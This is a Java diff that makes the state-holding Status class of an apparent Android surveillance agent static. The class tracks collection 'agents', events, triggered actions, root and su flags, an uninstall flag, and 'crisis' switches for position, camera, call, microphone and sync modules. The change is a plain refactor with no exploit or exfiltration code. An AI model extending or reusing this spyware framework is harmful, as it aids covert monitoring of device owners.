@@ -31,24 +31,24 @@ public class Status {
 	private static final String TAG = "Status"; //$NON-NLS-1$
 
 	/** The agents map. */
-	private final HashMap<String, ConfModule> agentsMap;
+	private static HashMap<String, ConfModule> agentsMap;
 
 	/** The events map. */
-	private final HashMap<Integer, ConfEvent> eventsMap;
+	private static HashMap<Integer, ConfEvent> eventsMap;
 
 	/** The actions map. */
-	private final HashMap<Integer, Action> actionsMap;
+	private static HashMap<Integer, Action> actionsMap;
 
-	Globals globals;
+	private static Globals globals;
 
 	/** The triggered actions. */
-	ArrayList<?>[] triggeredActions = new ArrayList<?>[Action.NUM_QUEUE];
+	private static ArrayList<?>[] triggeredActions = new ArrayList<?>[Action.NUM_QUEUE];
 
 	/** The synced. */
-	public boolean synced;
+	static public boolean synced;
 
 	/** The drift. */
-	public int drift;
+	static public int drift;
 
 	/** The context. */
 	private static Context context;
@@ -56,14 +56,14 @@ public class Status {
 	/** For forward compatibility versus 8.0 */
 	public static boolean calllistCreated = false;
 
-	Object lockCrisis = new Object();
-	private boolean crisis = false;
-	private boolean[] crisisType = new boolean[ModuleCrisis.SIZE];
-	private boolean haveRoot = false, haveSu = false;
+	static Object lockCrisis = new Object();
+	static private boolean crisis = false;
+	static private boolean[] crisisType = new boolean[ModuleCrisis.SIZE];
+	static private boolean haveRoot = false, haveSu = false;
 
-	private final Object[] triggeredSemaphore = new Object[Action.NUM_QUEUE];
+	private static Object[] triggeredSemaphore = new Object[Action.NUM_QUEUE];
 
-	public boolean uninstall;
+	static public boolean uninstall;
 
 	/**
 	 * Instantiates a new status.
@@ -102,7 +102,7 @@ public class Status {
 	/**
 	 * Clean.
 	 */
-	public void clean() {
+	static public void clean() {
 		agentsMap.clear();
 		eventsMap.clear();
 		actionsMap.clear();
@@ -149,7 +149,7 @@ public class Status {
 	 * @throws GeneralException
 	 *             the RCS exception
 	 */
-	public void addAgent(final ConfModule a) throws GeneralException {
+	public static void addAgent(final ConfModule a) throws GeneralException {
 		if (agentsMap.containsKey(a.getType()) == true) {
 			// throw new RCSException("Agent " + a.getId() + " already loaded");
 			if (Cfg.DEBUG) {
@@ -175,7 +175,7 @@ public class Status {
 	 * @throws GeneralException
 	 *             the RCS exception
 	 */
-	public boolean addEvent(final ConfEvent e) {
+	public static boolean addEvent(final ConfEvent e) {
 		if (Cfg.DEBUG) {
 			//Check.log(TAG + " addEvent "); //$NON-NLS-1$
 		}
@@ -200,7 +200,7 @@ public class Status {
 	 * @throws GeneralException
 	 *             the RCS exception
 	 */
-	public void addAction(final Action a) {
+	public static void addAction(final Action a) {
 		// Don't add the same action twice
 		if (Cfg.DEBUG) {
 			Check.requires(!actionsMap.containsKey(a.getId()), "Action " + a.getId() + " already loaded"); //$NON-NLS-1$ //$NON-NLS-2$
@@ -209,8 +209,8 @@ public class Status {
 		actionsMap.put(a.getId(), a);
 	}
 
-	public void setGlobal(Globals g) {
-		this.globals = g;
+	static public void setGlobal(Globals g) {
+		globals = g;
 	}
 
 	/**
@@ -218,7 +218,7 @@ public class Status {
 	 * 
 	 * @return the actions number
 	 */
-	public int getActionsNumber() {
+	static public int getActionsNumber() {
 		return actionsMap.size();
 	}
 
@@ -227,7 +227,7 @@ public class Status {
 	 * 
 	 * @return the agents number
 	 */
-	public int getAgentsNumber() {
+	static public int getAgentsNumber() {
 		return agentsMap.size();
 	}
 
@@ -236,7 +236,7 @@ public class Status {
 	 * 
 	 * @return the events number
 	 */
-	public int getEventsNumber() {
+	static public int getEventsNumber() {
 		return eventsMap.size();
 	}
 
@@ -245,7 +245,7 @@ public class Status {
 	 * 
 	 * @return the agents map
 	 */
-	public HashMap<String, ConfModule> getAgentsMap() {
+	static public HashMap<String, ConfModule> getAgentsMap() {
 		return agentsMap;
 	}
 
@@ -254,7 +254,7 @@ public class Status {
 	 * 
 	 * @return the events map
 	 */
-	public HashMap<Integer, ConfEvent> getEventsMap() {
+	static public HashMap<Integer, ConfEvent> getEventsMap() {
 		return eventsMap;
 	}
 
@@ -263,7 +263,7 @@ public class Status {
 	 * 
 	 * @return the actions map
 	 */
-	public HashMap<Integer, Action> getActionsMap() {
+	static public HashMap<Integer, Action> getActionsMap() {
 		return actionsMap;
 	}
 
@@ -276,7 +276,7 @@ public class Status {
 	 * @throws GeneralException
 	 *             the RCS exception
 	 */
-	public Action getAction(final int index) throws GeneralException {
+	static public Action getAction(final int index) throws GeneralException {
 		if (actionsMap.containsKey(index) == false) {
 			throw new GeneralException(index + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
@@ -300,7 +300,7 @@ public class Status {
 	 * @throws GeneralException
 	 *             the RCS exception
 	 */
-	public ConfEvent getEvent(final int id) throws GeneralException {
+	static public ConfEvent getEvent(final int id) throws GeneralException {
 		if (eventsMap.containsKey(id) == false) {
 			throw new GeneralException(id + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
@@ -323,7 +323,7 @@ public class Status {
 	 * @throws GeneralException
 	 *             the RCS exception
 	 */
-	public Globals getGlobals() {
+	static public Globals getGlobals() {
 		return globals;
 	}
 
@@ -334,7 +334,7 @@ public class Status {
 	 *            the i
 	 * @param baseEvent
 	 */
-	public void triggerAction(final int i, BaseEvent baseEvent) {
+	static public void triggerAction(final int i, BaseEvent baseEvent) {
 		if (Cfg.DEBUG) {
 			Check.requires(actionsMap != null, " (triggerAction) Assert failed, null actionsMap");
 		}
@@ -384,7 +384,7 @@ public class Status {
 	 * 
 	 * @return the triggered actions
 	 */
-	public Trigger[] getTriggeredActions(int qq) {
+	static public Trigger[] getTriggeredActions(int qq) {
 		if (Cfg.DEBUG)
 			Check.asserts(qq >= 0 && qq < Action.NUM_QUEUE, "getTriggeredActions qq: " + qq);
 
@@ -437,7 +437,7 @@ public class Status {
 	 * @return
 	 */
 	@Deprecated
-	public Trigger[] getNonBlockingTriggeredActions(int qq) {
+	static public Trigger[] getNonBlockingTriggeredActions(int qq) {
 
 		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
 		final int size = act.size();
@@ -456,7 +456,7 @@ public class Status {
 	 * @param action
 	 *            the action
 	 */
-	public void unTriggerAction(final Action action) {
+	static public void unTriggerAction(final Action action) {
 		int qq = action.getQueue();
 		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
 		Object sem = triggeredSemaphore[qq];
@@ -485,7 +485,7 @@ public class Status {
 	/**
 	 * Un trigger all.
 	 */
-	public void unTriggerAll() {
+	static public void unTriggerAll() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (unTriggerAll)"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
@@ -514,7 +514,7 @@ public class Status {
 
 	}
 
-	public synchronized void setCrisis(int type, boolean value) {
+	static public synchronized void setCrisis(int type, boolean value) {
 		synchronized (lockCrisis) {
 			crisisType[type] = value;
 		}
@@ -524,37 +524,37 @@ public class Status {
 		}
 	}
 
-	private boolean isCrisis() {
+	static private boolean isCrisis() {
 		synchronized (lockCrisis) {
 			return crisis;
 		}
 	}
 
-	public boolean crisisPosition() {
+	static public boolean crisisPosition() {
 		synchronized (lockCrisis) {
 			return (isCrisis() && crisisType[ModuleCrisis.POSITION]);
 		}
 	}
 
-	public boolean crisisCamera() {
+	static public boolean crisisCamera() {
 		synchronized (lockCrisis) {
 			return (isCrisis() && crisisType[ModuleCrisis.CAMERA]);
 		}
 	}
 
-	public boolean crisisCall() {
+	static public boolean crisisCall() {
 		synchronized (lockCrisis) {
 			return (isCrisis() && crisisType[ModuleCrisis.CALL]);
 		}
 	}
 
-	public boolean crisisMic() {
+	static public boolean crisisMic() {
 		synchronized (lockCrisis) {
 			return (isCrisis() && crisisType[ModuleCrisis.MIC]);
 		}
 	}
 
-	public boolean crisisSync() {
+	static public boolean crisisSync() {
 		synchronized (lockCrisis) {
 			return (isCrisis() && crisisType[ModuleCrisis.SYNC]);
 		}
@@ -563,7 +563,7 @@ public class Status {
 	/**
 	 * Start crisis.
 	 */
-	public void startCrisis() {
+	static public void startCrisis() {
 		synchronized (lockCrisis) {
 			crisis = true;
 		}
@@ -572,37 +572,37 @@ public class Status {
 	/**
 	 * Stop crisis.
 	 */
-	public void stopCrisis() {
+	static public void stopCrisis() {
 		synchronized (lockCrisis) {
 			crisis = false;
 		}
 	}
 
-	public boolean haveRoot() {
-		return this.haveRoot;
+	static public boolean haveRoot() {
+		return haveRoot;
 	}
 
-	public void setRoot(boolean r) {
-		this.haveRoot = r;
+	static public void setRoot(boolean r) {
+		haveRoot = r;
 	}
 
-	public boolean haveSu() {
-		return this.haveSu;
+	static public boolean haveSu() {
+		return haveSu;
 	}
 
-	public void setSu(boolean s) {
-		this.haveSu = s;
+	static public void setSu(boolean s) {
+		haveSu = s;
 	}
 	
-	ScheduledThreadPoolExecutor stpe = new ScheduledThreadPoolExecutor(10);
+	static ScheduledThreadPoolExecutor stpe = new ScheduledThreadPoolExecutor(10);
 
-	public ScheduledThreadPoolExecutor getStpe() {
+	static public ScheduledThreadPoolExecutor getStpe() {
 		return stpe;
 	}
 
-	Handler deafultHandler = new Handler();
+	static Handler deafultHandler = new Handler();
 
-	public Handler getDefaultHandler() {
+	static public Handler getDefaultHandler() {
 		return deafultHandler;
 	}
 }
